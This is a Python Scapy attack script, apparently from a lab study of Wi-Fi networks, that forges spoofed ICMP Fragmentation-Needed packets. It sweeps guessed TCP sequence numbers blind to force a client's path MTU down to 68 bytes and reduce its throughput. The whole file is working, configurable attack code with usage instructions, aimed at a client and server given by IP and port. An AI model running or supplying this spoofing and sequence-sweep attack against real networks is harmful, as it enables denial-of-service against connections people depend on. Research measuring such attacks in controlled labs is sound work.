#!/usr/bin/env python3
"""
Attack 2a - Blind Throughput-Reduction via ICMP Fragmentation-Needed 

Runs on a separate attacker machine on the same WiFi network.

Usage:
    sudo python3 attack2_pmtu_wifi.py <client_port> [duration_s] [target_mtu]
        [interval_s] [client_ip] [server_ip]

If no IPs are given, the default client/server IPs below are used.
"""

import struct
import sys
import time

from scapy.all import IP, TCP, Raw, send, conf, checksum


DEFAULT_CLIENT_IP = "192.168.0.201"
DEFAULT_SERVER_IP = "192.168.0.202"

SERVER_PORT = 5201

ASSUMED_WINDOW = 2_600_000
SEQ_SPACE = 2 ** 32
NUM_GUESSES = max(1, SEQ_SPACE // ASSUMED_WINDOW)


if len(sys.argv) < 2:
    print(
        "Usage: sudo python3 attack2_pmtu_wifi.py "
        "<client_port> [duration_s] [target_mtu] [interval_s] "
        "[client_ip] [server_ip]"
    )
    sys.exit(1)


CLIENT_PORT = int(sys.argv[1])
DURATION = int(sys.argv[2]) if len(sys.argv) > 2 else 120
TARGET_MTU = int(sys.argv[3]) if len(sys.argv) > 3 else 68
INTERVAL = float(sys.argv[4]) if len(sys.argv) > 4 else 2.0
CLIENT_IP = sys.argv[5] if len(sys.argv) > 5 else DEFAULT_CLIENT_IP
SERVER_IP = sys.argv[6] if len(sys.argv) > 6 else DEFAULT_SERVER_IP


print("⦿ Attack configuration:")
print("    Client        :", CLIENT_IP)
print("    Server        :", SERVER_IP)
print("    Client port   :", CLIENT_PORT)
print("    Server port   :", SERVER_PORT)
print("    Target MTU    :", TARGET_MTU)
print("    Duration      :", DURATION, "s, every", INTERVAL, "s")
print("    Guesses/round :", NUM_GUESSES)


route = conf.route.route(CLIENT_IP)

print("⦿ Route to client:")
print("    interface:", route[0])
print("    gateway  :", route[2])
print("    source   :", route[1])

if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack toward loopback. "
        "Make sure you're running this on the ATTACKER machine, "
        "not on the machine hosting the client/server aliases."
    )


def build_packet(seq):

    offending = (
        IP(
            src=CLIENT_IP,
            dst=SERVER_IP,
            proto=6
        )
        /
        TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="A",
            seq=seq,
            ack=0
        )
    )

    offending_bytes = bytes(offending)

    icmp_hdr = struct.pack(
        "!BBHHH",
        3,
        4,
        0,
        0,
        TARGET_MTU
    )

    icmp_body = icmp_hdr + offending_bytes
    csum = checksum(icmp_body)

    icmp_hdr = struct.pack(
        "!BBHHH",
        3,
        4,
        csum,
        0,
        TARGET_MTU
    )

    icmp_body = icmp_hdr + offending_bytes

    return (
        IP(
            src=SERVER_IP,
            dst=CLIENT_IP,
            proto=1
        )
        /
        Raw(load=icmp_body)
    )


def build_round():

    return [
        build_packet(
            (i * ASSUMED_WINDOW) % SEQ_SPACE
        )
        for i in range(NUM_GUESSES)
    ]


print(
    f"⦿ Sending {NUM_GUESSES}-packet seq-sweep rounds "
    f"(MTU={TARGET_MTU}) every {INTERVAL}s for {DURATION}s..."
)


t_start = time.time()
rounds = 0
sent = 0

while time.time() - t_start < DURATION:

    send(
        build_round(),
        verbose=False
    )

    rounds += 1
    sent += NUM_GUESSES

    print(
        f"⦿ Round {rounds}: sent "
        f"{NUM_GUESSES} forged PMTU={TARGET_MTU}B packets."
    )

    time.sleep(INTERVAL)


elapsed = time.time() - t_start

print(
    f"⦿ Sent {sent} packets across "
    f"{rounds} rounds over {elapsed:.1f}s."
)

print(
    "⦿ Check the iperf3 client's throughput on the target machine - "
    "run_cs_wifi.sh prints the before/after throughput reduction at the end."
)